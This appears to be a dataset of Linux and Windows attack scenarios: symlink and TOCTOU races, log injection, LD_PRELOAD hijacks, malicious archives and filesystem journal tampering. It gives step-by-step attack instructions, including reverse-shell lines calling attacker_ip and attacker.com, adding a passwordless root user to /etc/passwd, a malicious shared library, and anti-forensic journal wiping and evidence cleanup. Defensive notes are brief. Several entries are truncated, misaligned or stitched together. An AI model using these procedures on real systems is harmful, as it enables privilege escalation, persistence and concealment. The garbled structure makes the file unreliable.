Title: Temporary File Hijack
Attack Type: App creates temporary file insecurely, attacker replaces it with symlink
Scenario Description: Applications or services that create files in /tmp without using safe methods (like mkstemp()) can be tricked into writing to attacker-controlled targets via symlink.
Tools Used: ln -s, ls /tmp, strace, sleep, shell scripting, watch
Attack Steps: Step 1: Identify an application or SUID binary that creates a temporary file in /tmp/. For this example, assume /usr/bin/insecure-app (a SUID-root binary) creates /tmp/config.tmp before writing logs or sensitive data. Step 2: Confirm the behavior by running the app and checking /tmp in a separate terminal: watch ls -l /tmp. Observe the creation of the file. Step 3: Now, race the application by deleting the real temp file before it writes, and replacing it with a symbolic link to a sensitive file, like /etc/shadow: while true; do rm -f /tmp/config.tmp; ln -s /etc/shadow /tmp/config.tmp; done. Step 4: When the application tries to write to /tmp/config.tmp, it will follow the symlink and write directly into /etc/shadow, potentially corrupting or overwriting it. If you're fast enough, the app’s elevated write ends up modifying a protected file. Step 5: You can also target files like /root/.bashrc to inject commands that execute on root login: echo "malicious.sh" > /tmp/payload.sh && ln -s /root/.bashrc /tmp/config.tmp. Step 6: Once successful, trigger root login or re-run the application to see if the payload executes. Step 7: This is a classic Time-of-Check Time-of-Use (TOCTOU) flaw, where the app checks a file’s path but it’s swapped before actual usage. Step 8: Defenders can detect this by auditing symlink creation under /tmp, tracking high-privilege processes writing to symbolic links, and enabling fs.protected_symlinks = 1. Step 9: Clean up created links and files to reduce evidence.
Vulnerability: Insecure use of temporary file paths in writable directories
Impact: Privilege escalation, system compromise, data corruption
Detection Method: Detect symlinks targeting critical files; monitor /tmp activity; alert on abnormal file writes
Solution: Use mkstemp() or `O_EXCL
Tags: O_CREAT` for temp file creation; restrict world-writable dir access for sensitive processes
Source: TOCTOU, Temp File Exploit, Symlink Abuse, Privilege Escalation

Title: Backup File Swap
Attack Type: Exploit application’s insecure backup to redirect to sensitive files
Scenario Description: Some apps back up files (like config.json) into /tmp or user-writable directories. If not validated properly, attackers can symlink the backup destination to a sensitive file like SSH keys or bashrc.
Tools Used: ln -s, touch, watch, shell scripting, strace, cat
Attack Steps: Step 1: Find an app or script that backs up config files or user data to a predictable location like /tmp/backup.cfg or /tmp/config.bak. Suppose the app runs with higher privileges and backs up to /tmp/backup.bak. Step 2: Confirm the backup behavior using strace or logs. Look for logs like "Backing up config to /tmp/backup.cfg..." when the app starts. Step 3: Wait for the app to be idle and then quickly delete /tmp/backup.cfg and replace it with a symlink to a sensitive file. For example: rm /tmp/backup.cfg; ln -s ~/.ssh/id_rsa /tmp/backup.cfg. Step 4: Now when the app backs up data, it will follow the symlink and write over your .ssh/id_rsa file — destroying your key or replacing it with known content. This could also be used to read sensitive files if the app copies from disk into the backup file. Step 5: If the backup behavior uses cp config.cfg /tmp/backup.cfg or > /tmp/backup.cfg, your symlink will trigger, and your targeted file will be overwritten. Step 6: You can also create a symlink to /root/.bashrc or /etc/shadow and inject lines into it via the backup mechanism. Example payload: echo 'malicious content' >> config.cfg. Then, when the app backs it up, that payload ends up in a privileged file. Step 7: Confirm success by checking the target file (cat ~/.ssh/id_rsa or cat /root/.bashrc) to see if it was overwritten. Step 8: This technique is stealthy because logs may show a legitimate backup operation, and the file path appears safe. Step 9: Defenders can detect this by scanning /tmp for symlinks and monitoring where apps write backups. Step 10: Clean up after the test: rm /tmp/backup.cfg.
Vulnerability: Insecure backup location not protected from symlink abuse
Impact: Credential theft, config corruption, privilege escalation
Detection Method: Monitor /tmp for symlinks; alert when apps write to unexpected paths
Solution: Always use O_NOFOLLOW with backups; avoid writing to world-writable directories like /tmp
Tags: TOCTOU, Backup Hijack, Symlink Abuse, Data Corruption

Title: Sensitive File Read via Symlink
Attack Type: Program reads a file after a check, attacker swaps it with symlink
Scenario Description: Exploits the gap between file validation and usage to replace it with a symlink to a sensitive file (e.g., /etc/shadow), letting an unprivileged user read restricted files.
Tools Used: ln -s, strace, watch, sleep, shell scripts
Attack Steps: Step 1: Find an app or process that reads files you can influence. For example, assume /usr/bin/readme is a SUID binary that reads /tmp/user_input.txt and displays its content to screen. Step 2: Test the app: create a safe file echo "test" > /tmp/user_input.txt and run readme, confirming it reads and prints the file. Step 3: Use strace -f readme to understand when it opens the file — look for the gap between stat() and open(). This gap is exploitable if the app first checks the file exists, then opens it afterward. Step 4: Prepare a fast loop that replaces the file with a symbolic link between these two operations: while true; do rm -f /tmp/user_input.txt; ln -s /etc/shadow /tmp/user_input.txt; done. Step 5: In another terminal, launch the app: ./readme. If the timing is correct, your symlink will be followed, and the app (running as root) will read and print the contents of /etc/shadow — which normally requires root. Step 6: You now have root-only data leaked, including hashed passwords or configuration. Step 7: You can automate this using Python or C to monitor for file open and swap with precise timing. Step 8: This is a classic TOCTOU (Time-of-Check to Time-of-Use) vulnerability. Step 9: Defenders must scan apps that access /tmp or user-controlled locations and check for use of stat() or access() before open(). Step 10: Clean up after the test: rm /tmp/user_input.txt.
Vulnerability: TOCTOU race between file check and access via symlink
Impact: Unauthorized access to root-only files, data leakage
Detection Method: Monitor for non-root users triggering reads on sensitive files; detect /tmp symlink misuse
Solution: Programs should use open() with O_NOFOLLOW or secure APIs that don’t separate check and use
Tags: TOCTOU, File Disclosure, Symlink Swap, Privilege Abuse

Title: Log File Injection
Scenario Description: Applications often log user inputs (like usernames, IPs, form data) without sanitization. If these logs are parsed later by automated scripts or devs using source, bash, or less, injected commands may get executed, leading to privilege escalation or remote code execution.
Tools Used: Bash, curl, echo, crontab, any logging web app
Attack Steps: Step 1: Identify an application or service that logs user input to a file like app.log, access.log, or /var/log/custom.log. These could be usernames, feedback forms, or HTTP headers. You can test this with a web app, a feedback form, or a Linux CLI utility that logs input (such as a bash script). Step 2: Try submitting a special payload instead of normal input. For example, instead of entering a username like john, enter: $(id > /tmp/log_injection.txt) or `id > /tmp/log_injection2.txt` — this will appear in the log file exactly as-is. Step 3: Now, locate the log file where this input is stored (e.g., /var/log/app.log). If you're on a system where this log is processed or read using source, bash, or loaded into a shell script (for reporting or alerts), these characters could be interpreted as real commands. Step 4: You can test this by manually simulating the log being parsed by an admin or automation: run bash app.log or source app.log. If your command executes, you’ll see the output in /tmp/log_injection.txt, confirming execution. Step 5: You can extend this further to inject a reverse shell like $(bash -i >& /dev/tcp/attacker_ip/4444 0>&1) or a cron job: */1 * * * * root bash -c 'echo owned > /tmp/rooted.txt'. Step 6: This also works if logs are consumed by cron jobs, systemd units, or auto-parsing tools that assume log content is safe — they will execute the embedded payloads. Step 7: Some tools like less can also be tricked using ANSI escape sequences (like \033[2J) that clear the screen or hide malicious lines when logs are reviewed. Step 8: To make this stealthier, use payloads that look harmless or pad them with blank space, then use terminal log viewing tools like less or tail -f. Step 9: You can chain this with persistence by inserting the payload into system-wide logs, which are auto-parsed by audit/reporting scripts or by engineers during troubleshooting. Step 10: Defenders can detect this by monitoring logs for patterns like $(, backticks, or suspicious characters, and never executing logs with interpreters like bash, sh, or source.
Vulnerability: Input logged without sanitization or escaping
Impact: Local or remote command execution, persistence
Detection Method: Log scanner detecting suspicious characters like $, ;, `
Solution: `, backticks in log entries
Tags: Sanitize input before logging; store logs in write-only formats; never source or bash a log file
Source: Log Injection, RCE, Command Execution, Bash Abuse

Title: Systemd Temp Directory TOCTOU
Attack Type: Symlink Swap in Temp File Path
Scenario Description: A system-level service or app (like a systemd socket or installer) checks for a socket/file in /var/tmp, but between check and use, attacker replaces it with a symlink to a privileged file, causing overwrite or code injection.
Tools Used: ln -s, rm, watch, strace, bash, sleep, ls
Attack Steps: Step 1: Identify a systemd service or root-level application that creates or writes a file (such as a Unix socket, log, or config) to /tmp or /var/tmp. These locations are world-writable, so you can potentially manipulate them. Example: /var/tmp/myapp.sock. This could be used by an installer or a temporary IPC socket. Step 2: Use strace or auditd to monitor when this file is accessed. Example: strace -f -e trace=file systemctl start myservice. Look for this pattern in logs: first, the app checks whether the file exists (stat() or access()), then it opens or creates the file. This is the TOCTOU window (time-of-check to time-of-use). Step 3: In one terminal, prepare a loop script that rapidly replaces the file with a symbolic link. Example bash script: while true; do rm -f /var/tmp/myapp.sock; ln -s /etc/shadow /var/tmp/myapp.sock; done. This replaces the expected socket with a symlink to /etc/shadow or any other critical file. Step 4: In another terminal, start the vulnerable application or systemd service using systemctl start myservice or run the app manually. If your timing is right, the application will follow the symlink and attempt to write to /etc/shadow, corrupting or overwriting root-owned files. Step 5: If successful, this could result in denial of service (system can't authenticate users), privilege escalation (if you write controlled content to /etc/profile, .bashrc, etc.), or total system compromise. Step 6: To test harmlessly, use a non-critical file like /root/test.txt instead of /etc/shadow first. Step 7: Check file ownership and timestamps to confirm overwrite using ls -l /etc/shadow or stat /etc/shadow. Step 8: Clean up the symlink after the test to avoid affecting future processes: rm /var/tmp/myapp.sock. Step 9: This attack is extremely stealthy and can be automated with tight timing. Defenders can detect this with audit logs showing unexpected symbolic links in /var/tmp or /tmp. Step 10: Developers must ensure privileged apps do not trust files in world-writable locations and use O_NOFOLLOW, O_EXCL, or create temp files with mkstemp().
Vulnerability: TOCTOU between file check and open via symbolic link
Impact: Privileged file overwrite, denial of service, local root
Detection Method: Monitor for symbolic links in /var/tmp; audit privileged file open events targeting temp directories
Solution: Don't use world-writable paths for sensitive files; use secure temp file creation (mkstemp(), O_NOFOLLOW)
Tags: TOCTOU, Symlink Exploit, Temp Path Vulnerability

Title: Installer .desktop File Attack
Attack Type: GUI Installer Symlink Abuse in .desktop File
Scenario Description: Some graphical installers or software updaters temporarily drop .desktop shortcut files in /tmp, which may be world-writable. Attacker can race to replace the .desktop file with a symlink pointing to an arbitrary file to overwrite it with attacker-controlled data.

Step 10: Defenders must detect symlinks in world-writable directories and ensure installers use secure paths like $HOME/.local/share/applications or use mkstemp() for temp file creation.

Impact: Launcher overwrite, sudoers overwrite, privilege escalation
Detection Method: Monitor .desktop creation in /tmp; detect symlink writes during install

Title: File Lock Race Condition with Symlink
Attack Type: Symlink Injection via File Lock Race
Scenario Description: Apps that lock a file before writing (e.g., .lock files) but don’t re-check it during write phase are vulnerable to a symlink swap between lock and write.
Tools Used: ln -s, flock, rm, bash, file-monitoring tools
Attack Steps: Step 1: Identify a process or script that creates lock files like program.lock in /tmp, /var/tmp, or /run/lock/. This usually happens before modifying sensitive files like config, cache, or state files. Example: A backup script uses /tmp/backup.lock to ensure only one process runs. Step 2: Start the app and confirm it creates the lock with touch /tmp/backup.lock. Then the app writes to /etc/backup.conf. Step 3: In a second terminal, start a loop that watches the lock file: while true; do rm -f /tmp/backup.lock; ln -s /etc/passwd /tmp/backup.lock; done. Step 4: Re-run the target app or script. The app will acquire the lock using flock() or similar but won't re-check the link. So it ends up writing to /etc/passwd through your symlink. Step 5: Check overwrite by looking at /etc/passwd content or timestamp. If successful, you can inject a new root user like: root2:x:0:0::/root:/bin/bash. Step 6: You now have shell access as root using su root2. Step 7: This works best on custom scripts or legacy backup/installer tools that don’t verify lock file targets after creation. Step 8: Clean up by removing the malicious symlink. Step 9: Defenders should check if any lock file operations allow symlinks and enforce atomic file creation with O_NOFOLLOW. Use secure file-locking libraries or place locks in trusted locations. Step 10: Monitor /tmp for link creation near lock file usage or write access to unexpected files like /etc/passwd.
Vulnerability: File lock logic vulnerable to time-of-use symlink swap
Impact: Privileged file overwrite, root access creation
Detection Method: Audit symlink usage in /tmp; monitor for file lock + overwrite patterns in scripts
Solution: Don’t use lock files in /tmp; check file identity post-lock; use O_NOFOLLOW and trusted lock paths
Tags: Lock Hijack, Symlink Race, Priv Escalation

Scenario Description: Many recovery or upgrade tools create temporary disk image files, logs, or configs in /tmp or /var/tmp. Title: LD_PRELOAD Hijack via Symlink
Attack Type: Dynamic Linker Hijack via Symlink to Malicious Library
Scenario Description: Apps or system scripts sometimes use environment variables like LD_PRELOAD or LD_LIBRARY_PATH to inject libraries. If a path or script is in /tmp, and attacker can symlink it to a malicious .so file, the next time the app runs (especially as root), the attacker's code gets executed with elevated privileges.
Tools Used: gcc, ln -s, bash, watch, LD_PRELOAD, sudo
Attack Steps: Step 1: Understand that LD_PRELOAD allows injecting custom shared libraries (.so files) into processes at runtime. Apps that trust or allow environment variable manipulation can be tricked into loading your malicious code. Step 2: Create a simple .so library that runs code on load. Example C code: #include <stdio.h>\nvoid _init() { system("touch /tmp/pwned_by_ld.so"); } Step 3: Compile it: gcc -fPIC -shared -o evil.so evil.c. This creates a library that runs touch as soon as it’s loaded. Step 4: In /tmp, find a path where a root-owned binary or script loads from or drops libraries (e.g., /tmp/libcommon.so). Step 7: You can modify the payload to open a reverse shell or add a new user using system() calls. Step 8: Check if it worked by verifying the side-effect (e.g., ls /tmp/pwned_by_ld.so). Step 9: Clean up the .so and symlink if needed. Step 10: Defenders should never allow writable library locations in root scripts. All binaries should clear environment variables like LD_PRELOAD, and validate library paths. Also, scan /tmp for suspicious .so or symlinks.
Vulnerability: Insecure loading of libraries from world-writable path
Detection Method: Audit use of LD_PRELOAD; monitor for symlinks in /tmp to .so libraries
Solution: Don’t load .so from /tmp; clear LD_* vars in scripts; scan for .so symlinks in shared library locations
Tags: LD_PRELOAD Exploit, Library Hijack, Symlink Trick

Title: Symlink in World-Writable Directory (/tmp)
Attack Type: Time-of-Check to Time-of-Use (TOCTOU) via Symlink in /tmp
Scenario Description: Some applications and system tools write logs, config files, or temp files to /tmp or /var/tmp without checking for symbolic links. An attacker can exploit this by creating a symlink from a predictable filename (e.g., /tmp/config.log) to a sensitive file like /etc/shadow. When the app writes to it, it overwrites the critical file.

Step 8: Defenders must enforce O_NOFOLLOW flags in file operations and restrict writes to protected paths using AppArmor or SELinux.

Title: Device Node Overwrite

Scenario Description: Some programs write to /dev/ (e.g., loggers, custom device utilities, kernel modules). If attacker creates a fake device node or symlink, they can trick the app into writing to a different device or file, allowing for file overwrite or system impact.
Attack Steps: Step 1: Understand that /dev contains device files like /dev/null, /dev/tty, or /dev/log. These are special files used by the kernel and applications. Step 7: If the app writes to your node, you can hijack or destroy critical files. Step 8: For kernel modules or device tools, this may also result in kernel crash or DoS. Step 9: Clean up: rm /tmp/fakedev. Step 10: Developers should validate device paths before opening or writing. Avoid dynamic /dev references unless absolutely needed. Use proper permissions and context labels.
Vulnerability: Writable fake device or misused path leads to overwrite

Detection Method: Monitor for writes to unusual /dev/* files; detect device misuse or path confusion

Title: .Xauthority or .bashrc Corruption
Attack Type: Privileged-to-user file overwrite via symlink redirection
Scenario Description: When a root process writes to a user-owned file (e.g., status logs or temp files), and the attacker can symlink the target to .bashrc, .profile, or .Xauthority, it causes code to run as user upon next login or GUI session. This allows root-to-user code injection.
Tools Used: ln -s, echo, bash, strace, watch, nano
Attack Steps: Step 1: Understand that .bashrc and .profile are config files read when a user logs into the terminal or shell. If root writes to a file in your home directory and you can symlink it to .bashrc, you can inject a command. Step 2: Find a root process (or cronjob) that writes into your home directory, e.g., /home/youruser/status.log. You can detect this with tools like auditctl or inotifywait. Step 3: If you can predict the file’s name, delete it and replace it with a symlink: ln -sf ~/.bashrc /home/youruser/status.log. This means the next time the app tries to write to status.log, it will overwrite .bashrc instead. Step 4: Add malicious content into the log manually or let the app write something. If you're injecting manually: echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> ~/.bashrc. Step 5: Once the file is written, logout and log back in (or wait for the user to log in). The .bashrc file gets sourced, and the malicious command executes. Step 6: This gives you remote shell or allows other persistent payloads. Step 7: You can repeat the same trick with .profile, .Xauthority, or any other startup-executed file. Step 8: Defenders must prevent privileged processes from writing to user-controlled paths and enforce file ownership verification. Step 9: Scan .bashrc for unauthorized additions regularly and restrict root writes to home directories.
Target Type: User login shell or GUI session
Vulnerability: Privileged app overwrites login script via symlink
MITRE Technique: T1059.004 – Command Execution via Startup Scripts
Impact: Code execution as user on login
Detection Method: Monitor shell init files for unusual changes; audit root write paths
Solution: Never allow root to write in user-owned folders unless verified; validate file targets with secure APIs
Tags: Bashrc Hijack, Init File Exploit, Symlink Redirection

Title: Auto-Extract File Symlink Trap
Scenario Description: Attackers craft ZIP or TAR files that include symlinks pointing outside the extraction directory. When a root or privileged user auto-extracts it (e.g., with tar -x, unzip), files overwrite arbitrary locations (e.g., /etc/passwd, .bashrc).
Tools Used: ln -s, zip, tar, echo, mkdir, unzip, tar
Attack Steps: Step 1: Understand that archive utilities like tar and unzip will, by default, follow symlinks if not properly restricted. This means a malicious archive can place symlinks inside it pointing to system files. Step 2: Create a fake directory: mkdir evilzip. Inside it, create a symlink: ln -s /etc/passwd evilzip/fakefile. This links fakefile to /etc/passwd. Step 3: Add a malicious file named fakefile: echo "root::0:0:root:/root:/bin/bash" > fakefile. Step 4: Use zip to pack it (without following symlinks): zip --symlinks -r evil.zip evilzip/. This keeps the symlink inside the archive. Step 5: Send this archive to a root user (or a service that extracts files automatically), or place it where an admin will extract it (e.g., upload form, shared folder). Step 6: When the admin runs unzip evil.zip or tar -xf evil.tar, the archive writes your payload to /etc/passwd or any other symlinked target. Step 7: This can allow privilege escalation, persistence, or DoS. You can replace .bashrc, .ssh/authorized_keys, etc. Step 8: Defenders must use extraction flags that prevent symlink resolution like --no-same-owner and avoid running as root. Step 9: Admins should inspect archive contents before extraction: tar -tvf or unzip -l. Step 10: Regular audits of critical system files and hashes can catch such tampering attempts.
Target Type: Archive extractors or root unzipper apps
Impact: File overwrite, user takeover, privilege escalation
Detection Method: Detect archives with symlinks inside; validate extracted file paths
Solution: Never extract untrusted archives as root; use safe flags like --no-overwrite-dir and verify contents first
Tags: Zip Bomb, Symlink Trap, Archive Exploit

Title: Windows NTFS Junctions + TOCTOU
Attack Type: Time-of-Check to Time-of-Use via Junction Hijack (Windows)
Scenario Description: Windows NTFS junction points can be abused in race conditions. When a privileged app checks a path and then uses it, attacker can replace the path with a junction pointing to another location (e.g., C:\Windows\System32), causing the privileged app to write to protected folders.
Tools Used: cmd, mklink /J, Sysinternals Process Monitor, powershell
Attack Steps: Step 1: Understand that NTFS junctions are like symlinks for directories on Windows. They can redirect access from one folder to another. Step 2: Identify a program or system utility that writes files into a user-controlled folder, such as C:\Users\Public\Updates\temp\. This path must be writable by the attacker. Step 3: Use a tool like Process Monitor (ProcMon) to trace if the app first checks the folder, then writes later (time gap). This indicates a TOCTOU vulnerability. Step 4: Prepare by creating a decoy folder: mkdir C:\Users\Public\Updates\temp. Step 5: Set a script or use a file system watcher to delete that folder right after it’s checked, and then immediately create a junction with mklink /J C:\Users\Public\Updates\temp C:\Windows\System32. This causes the program to write into System32 instead of the temp folder. Step 6: The program thinks it’s writing to a safe path, but ends up overwriting or creating files in protected directories. You can hijack binaries, replace services, or escalate privileges. Step 7: Automate this race using a loop or file monitor to swap the folder at just the right moment. Step 8: Use dir /aL to verify that your junction exists. Step 9: Defenders should use file handle validation instead of paths and reject junctions where not needed.
Vulnerability: TOCTOU + junction allows redirection to protected path
MITRE Technique: T1574.010 – Hijack Execution Flow: Services Registry
Impact: Write to protected paths, privilege escalation
Detection Method: Monitor for rapid folder deletion and re-creation; validate junction targets
Solution: Use atomic path checking and access; avoid path-based assumptions; implement secure file handle tracking

Title: Mount Point Redirection (Linux)
Attack Type: Linux mount hijack via temporary mount point switch
Scenario Description: If a privileged program reads from or writes to a folder (e.g., /mnt/task/), an attacker with CAP_SYS_ADMIN can replace that mount point during operation, redirecting I/O to an unintended location.
Tools Used: mount, umount, mkdir, nsenter, auditd, bash
Attack Steps: Step 1: On Linux, a mount point is a location where storage or a virtual filesystem is attached. Programs accessing files through that mount point don’t see the backing filesystem directly. Step 2: As root (or inside a container with CAP_SYS_ADMIN), create a mountable directory: mkdir /tmp/fake && mount --bind /etc /tmp/fake. This mounts /etc on /tmp/fake. Step 3: Find a privileged app or script that reads from or writes to /mnt/data/ and confirm it has a race gap using strace. Step 4: Before or during the access, unmount /mnt/data: umount /mnt/data, then replace it: mount --bind /etc /mnt/data. Now /mnt/data points to /etc. Step 5: The program writing to /mnt/data/config.yaml may now end up writing to /etc/config.yaml instead. This could corrupt config files or escalate privileges. Step 6: You can mount any protected directory to /mnt/data and trap the app. Step 7: To observe this, use lsns or mount to check mounts. Step 8: Clean up using umount and mount --move to revert original mount points. Step 9: Defenders must use strict mount namespaces and validate mount targets in critical paths. File access should use file descriptors, not path lookups, to prevent switching.
Vulnerability: Mount point can be changed at runtime via race
MITRE Technique: T1222.002 – File and Directory Permissions Modification
Impact: Misfiled writes, config overwrite, privilege gain
Detection Method: Watch mount/umount system calls; monitor runtime changes in /proc/mounts
Solution: Lock mount points via namespace isolation; avoid bind mounts for sensitive operations
Tags: Mount Race, Filesystem Hijack, Linux TOCTOU

Title: Snap/Flatpak App Data Redirection
Scenario Description: Flatpak and Snap use isolated container-like directories to store app data (e.g., ~/.var/app/, /snap). Attackers can redirect or bind these to overwrite other user data or steal files.
Tools Used: ln -s, flatpak, snap, bash, mount, fuse, chattr
Attack Steps: Step 1: Understand that Snap and Flatpak isolate user apps using sandboxed directories. For Flatpak, it stores app data in ~/.var/app/com.example.App/. If the app blindly writes here, attackers can abuse this. Step 2: Create a malicious symlink: ln -s /home/user/.bashrc ~/.var/app/com.example.App/data. If the app writes logs or configs into data, it now overwrites .bashrc. Step 3: Flatpak apps may have reduced permissions, but if the app has file-write access (via portals or shared paths), this redirection works. Step 4: For Snap, create a bind mount: sudo mount --bind /etc/passwd /home/user/snap/myapp/common/passwd. If the Snap app writes here, it overwrites system files. Step 5: Monitor Flatpak using flatpak info --show-permissions com.example.App. If it allows host, home, or downloads, it can access user files. Step 6: Exploit poorly configured permissions to redirect data writes. Step 7: If a Flatpak has full home access, you can make a symlink chain into .ssh/authorized_keys and wait for logs to overwrite it. Step 8: This results in code execution, user compromise, or persistence. Step 9: Defenders must enforce sandbox rules, monitor Flatpak/Snap app permissions, and avoid --filesystem=host. Step 10: Always verify Snap/Flatpak policies with: snap connections and flatpak permission-show.
Vulnerability: Misused bind mounts or symlinks for sandbox escape
Impact: User data overwrite, sandbox escape, persistent access
Detection Method: Monitor sandbox permissions; audit Snap/Flatpak policies; detect unusual symlink chains
Solution: Restrict app permissions; use strict AppArmor, disallow --filesystem=host or wide host access
Tags: Snap Exploit, Flatpak Escape, Container Redirection

Title: Journal Replay Attack
Scenario Description: Linux filesystems like ext4 and XFS use journals to recover from crashes. Attackers with raw disk access can tamper with journal entries, so when the system reboots, malicious entries are replayed into real files.
Tools Used: debugfs, dd, ext4magic, hexedit, fsck, Live ISO
Attack Steps: Step 1: Understand journaling: ext4 and XFS log file operations (writes, deletions) into a journal. Upon reboot after a crash or power loss, fsck replays journal entries to restore file consistency. Step 2: Boot into a live Linux USB (like Kali, Ubuntu) and mount the target disk without auto-mounting: mount -o ro /dev/sda1 /mnt. Step 3: Identify the journal block using debugfs: run debugfs /dev/sda1, then use logdump or show_super_stats to locate journal area. Step 4: Extract the journal file using dd or ext4magic, e.g., dd if=/dev/sda1 of=journal.bin bs=4096 skip=START count=NUM. Step 5: Analyze the binary journal data with hexedit or ext4magic. Look for past write operations or zeroed data blocks. Step 6: Replace part of the journal entry that says "write X content to Y location" with your payload — for example, overwrite a ~/.bashrc file with malicious shell code using hex values. Step 7: Save modified journal and write it back to disk using dd. Step 8: Unmount everything and reboot the system normally. Step 9: As the journal replays, your injected write is committed — for example, .bashrc now runs a reverse shell. Step 10: Defender detection is difficult unless journaling is disabled or hashes of journal blocks are maintained. Step 11: Always monitor for unexpected file changes post-reboot and restrict physical/raw disk access.
Vulnerability: Raw journal write triggers on fsck replay
Impact: Post-boot privilege escalation or persistent implant
Detection Method: Detect unusual journal replay; monitor fsck reports; scan for sudden file overwrites at boot
Solution: Lock down physical access; disable journaling for critical partitions; use filesystem integrity tools like IMA/EVM

Title: Journal Injection for Data Manipulation
Scenario Description: Attackers craft fake journal entries that trick the filesystem into creating or modifying specific files after reboot, bypassing normal file permissions.
Tools Used: debugfs, e2image, hexedit, ext4magic, dd, Live ISO
Attack Steps: Step 1: Use a Linux Live ISO (like Kali) to boot into the system where you have raw disk access. Do not mount the filesystem directly. Step 2: Use e2image -ra /dev/sda1 backup.img to get a full image including metadata and journal. Step 3: Open the image in hexedit or a hex editor. Locate the journal superblock (usually near the start of reserved journal space). Step 4: Analyze known journal transaction formats. You can find sample writes by looking at journal logs in previous test systems. Step 5: Craft a journal entry that simulates "write this content to this inode or block" (e.g., inject root::0:0:root:/root:/bin/bash into /etc/passwd block). Step 6: Inject that journal entry into a transaction block. Ensure checksums are properly aligned to avoid fsck failure. Step 7: Save the modified image and use dd to overwrite the original journal area: dd if=modified.img of=/dev/sda1 bs=4096 seek=START count=NUM. Step 8: Unmount and reboot the host system. Step 9: If fsck runs or journaling is active, it replays your transaction, modifying files invisibly. Step 10: This may bypass logs, audit trails, or any app-layer checks. Step 11: Defenders must validate journal integrity, hash journals post-boot, and restrict disk write access via secure boot/TPM.
Vulnerability: Forged write injected in journaling buffer
Impact: Covert file overwrite, root shell injection
Detection Method: Boot-time file integrity checker (AIDE, Tripwire); journal digest verification
Solution: Enable secure boot; use journaling in checksum mode; lock kernel journaling parameters
Tags: ext4 attack, journal injection, data forgery

Title: Anti-Forensics via Journal Tampering
Attack Type: Hide file operations by altering or scrubbing journals
Scenario Description: Attackers erase, modify, or truncate filesystem journals to hide evidence of file creation, modification, or access — a stealth method used in malware cleanup or persistence.
Tools Used: ext4magic, debugfs, dd, wipefs, hexedit, livecd
Attack Steps: Step 1: After gaining access to a system and performing file changes (e.g., placing malware in /usr/bin/), the attacker wants to hide these actions. Step 2: Reboot into a Live Linux environment and locate the filesystem (e.g., /dev/sda1). Do not mount it to prevent journal replay. Step 3: Use ext4magic /dev/sda1 -f /usr/bin/malware to locate journal entries referencing that file. Step 4: Extract the journal to a file using dd, then load it into hexedit. Step 5: Locate and zero out blocks that reference sensitive file names or paths. Step 6: Alternatively, use wipefs or dd if=/dev/zero to erase the entire journal: dd if=/dev/zero of=/dev/sda1 bs=4096 seek=JOURNAL_START count=JOURNAL_SIZE. Step 7: This erases any trace of the file operation from journal replay buffers. Step 8: Mount the filesystem again and verify the file still exists, but no journal history is recoverable. Step 9: This technique hides attacks from forensics tools that depend on journal reconstruction. Step 10: Defenders should hash or export journals regularly and store them externally. Monitor for sudden journal truncation or corruption. Step 11: Use IMA/EVM or kernel integrity modules to verify FS state over time.
Vulnerability: Journal erased to hide past filesystem changes
Detection Method: Monitor for deleted or corrupted journals; validate replay logs
Solution: Remote journaling; deploy immutable logs; secure boot; audit journal files via Tripwire or IMA

Title: Triggering Privileged Recovery Scripts
Attack Type: Forced Execution of Root-Owned Recovery Workflows
Scenario Description: Some recovery scripts (like initramfs repairs) execute after detecting file corruption; attackers can manipulate this logic to trick the system into executing malicious recovery logic as root.
Tools Used: debugfs, initramfs-tools, touch, Live ISO, fsck, init=/bin/bash
Attack Steps: Step 1: Identify systems that use recovery scripts like /etc/initramfs-tools/scripts/, /etc/rc.local, or /etc/systemd/system/. These scripts are often triggered by filesystem issues or missing configs. Step 2: Simulate file corruption: touch /etc/fstab and corrupt it with random data using dd if=/dev/urandom of=/etc/fstab bs=1K count=1. Step 3: Force a reboot using reboot or hard power-off. Step 4: On next boot, initramfs or the init system may detect failure and call root-owned scripts like /bin/recovery.sh. Step 5: Replace or inject payload into these scripts using earlier access (e.g., echo 'nc attacker.com 4444 -e /bin/bash' >> /bin/recovery.sh). Step 6: Upon boot, system executes recovery script as root, resulting in code execution or backdoor. Step 7: To hide traces, modify timestamps back: touch -r /bin/bash /bin/recovery.sh. Step 8: Defender must lock recovery folders and validate file hashes at runtime. Use kernel lockdown or IMA policies to prevent unsigned script execution.
MITRE Technique: T1204 – User Execution; T1547.001 – Boot or Logon Autostart
Impact: Root-level code execution through boot flow
Detection Method: Monitor system boot flow; hash critical recovery scripts; use boot logs and secure boot tracing
Solution: Use secure boot; mount /bin and /etc as readonly during recovery; enforce signature checking
Tags: Recovery Script Exploit, Root Escalation, Init Abuse

Title: Journal Starvation Attack (DoS)
Attack Type: Denial of Service by Saturating Journal Space
Scenario Description: Filesystem journals have finite size. By rapidly generating filesystem activity (e.g., file creation, deletion, renaming), attackers can flood the journal, causing fsync to block and system slowdown.
Tools Used: dd, fsstress, watch, iotop, Live ISO
Attack Steps: Step 1: Understand that ext4 or XFS journaling systems reserve a fixed journal size (usually a few MBs). All metadata changes are logged here. If it’s full, operations must wait. Step 2: Use tools like fsstress to simulate excessive file operations: fsstress -n 100000 -d /tmp/testdir. Step 3: Alternatively, use a shell loop to create/delete files rapidly: while true; do touch file_$RANDOM; rm file_$RANDOM; done. Step 4: Monitor journal occupancy with iotop, vmstat, or by inspecting /proc/diskstats. Step 5: As journal fills, operations requiring metadata (like cp, mkdir, mv) begin to lag or fail. Step 6: On smaller embedded systems or containers with constrained I/O, this can render the system unusable. Step 7: To persist attack, use a cron job or systemd timer to restart the file spamming loop. Step 8: Defender can detect constant I/O saturation, high fsync latency, and journal overflows in logs (dmesg, journalctl). Step 9: Solution includes increasing journal size or limiting journal writes per user.
Detection Method: Monitor for high I/O throughput; enforce per-user I/O quotas; alert on repetitive mkdir/rm actions
Solution: Use cgroups and quota systems; expand journal size or enable journaling prioritization
Tags: Journal DoS, Filesystem Freeze, Resource Exhaustion

Title: Filesystem Check Bypass
Attack Type: Journal Corruption to Skip fsck Validations
Scenario Description: Attackers corrupt ext4 journal blocks in a way that tricks fsck into skipping tampered metadata or file blocks, thus bypassing security checks or restoring infected files.
Tools Used: dd, debugfs, fsck, e2image, hexedit, Live Linux ISO
